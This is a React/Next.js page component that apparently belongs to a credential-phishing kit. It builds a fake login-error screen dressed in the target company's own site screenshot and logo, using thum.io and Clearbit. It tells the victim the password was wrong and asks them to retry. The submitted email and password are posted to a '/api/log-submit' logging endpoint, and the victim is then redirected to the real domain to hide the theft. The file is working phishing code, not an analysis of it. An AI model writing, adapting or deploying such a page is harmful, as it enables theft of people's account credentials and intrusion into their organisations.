'use client'

import '../../styles/globals.css'
import { useSearchParams, useRouter } from 'next/navigation'
import { useState, useEffect } from 'react'
import { getThumURL } from 'thum.io'

export default function EndPage() {
  const params         = useSearchParams()
  const router         = useRouter()
  const email          = params.get('email') || ''
  const urlParamDomain = params.get('domain') || ''

  const [password, setPassword]   = useState('')
  const [errors, setErrors]       = useState({ password: '' })
  const [showModal, setShowModal] = useState(false)

  const [domainToCapture, setDomainToCapture] = useState('')
  const [screenshotUrl, setScreenshotUrl]     = useState('')
  const [logoUrl, setLogoUrl]                 = useState('')
  const [logoError, setLogoError]             = useState(false)

  // decide domain
  useEffect(() => {
    if (urlParamDomain) {
      setDomainToCapture(urlParamDomain)
    } else {
      const parts = email.split('@')
      setDomainToCapture(parts.length === 2 ? parts[1] : '')
    }
  }, [urlParamDomain, email])

  // build thum.io background
  useEffect(() => {
    if (!domainToCapture) return
    const secret = process.env.NEXT_PUBLIC_THUM_IO_SECRET!
    const keyId  = process.env.NEXT_PUBLIC_THUM_IO_KEY_ID!

    setScreenshotUrl(
      getThumURL({
        url: `https://${domainToCapture}`,
        width: 1200,
        auth: { type: 'md5', secret, keyId },
      })
    )
  }, [domainToCapture])

  // build Clearbit logo URL
  useEffect(() => {
    if (!domainToCapture) return
    setLogoError(false)
    setLogoUrl(`https://logo.clearbit.com/${domainToCapture}`)
  }, [domainToCapture])

  const handleRetry = async (e: React.FormEvent) => {
    e.preventDefault()
    if (password.length < 5) {
      setErrors({ password: 'Minimum 5 characters' })
      return
    }
    setShowModal(true)
    await fetch('/api/log-submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, domain: domainToCapture }),
    })
    setTimeout(() => {
      window.location.href = `https://${domainToCapture}`
    }, 2000)
  }

  return (
    <div className="login-container relative min-h-screen">
      {/* thum.io background + tint */}
      {screenshotUrl && (
        <div className="absolute inset-0 overflow-hidden">
          <img
            src={screenshotUrl}
            alt={`Screenshot of ${domainToCapture}`}
            className="w-full h-full object-cover opacity-50 pointer-events-none"
          />
          <div className="absolute inset-0 bg-light-blue/50 pointer-events-none" />
        </div>
      )}

      {/* Centered error card */}
      <div className="relative z-10 mx-auto mt-20 bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">
        {/* Logo or initial */}
        <div className="flex justify-center mb-4">
          {logoUrl && !logoError ? (
            <img
              src={logoUrl}
              alt={`Logo of ${domainToCapture}`}
              onError={() => setLogoError(true)}
              className="w-16 h-16 rounded-full object-cover"
            />
          ) : (
            <div className="w-16 h-16 rounded-full bg-gray-300 flex items-center justify-center text-xl text-white">
              {email[0]?.toUpperCase()}
            </div>
          )}
        </div>

        <h1 className="text-sm font-bold text-center mb-2 text-red-600">
          Wrong email or password. Please retry.
        </h1>
        <p className="text-center mb-4 text-gray-700">{email}</p>

        <form onSubmit={handleRetry} className="space-y-4">
          <input
            type="password"
            placeholder="Enter your password"
            value={password}
            onChange={e => {
              setPassword(e.target.value)
              if (errors.password && e.target.value.length >= 5) {
                setErrors({ password: '' })
              }
            }}
            className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-400"
            required
          />
          {errors.password && (
            <p className="text-sm text-red-600">{errors.password}</p>
          )}
          <button
            type="submit"
            className="w-full bg-red-500 text-white py-3 rounded-lg hover:bg-red-600 transition"
          >
            Retry
          </button>
        </form>
      </div>

      {/* Submission Modal */}
      {showModal && (
        <div className="fixed inset-0 z-20 flex items-center justify-center bg-black/50">
          <div className="bg-white rounded-xl shadow-lg p-6 max-w-sm text-center">
            <h2 className="text-xl font-semibold text-gray-800">
              Please wait…
            </h2>
            <p className="mt-2 text-gray-600">*</p>
          </div>
        </div>
      )}
    </div>
  )
}
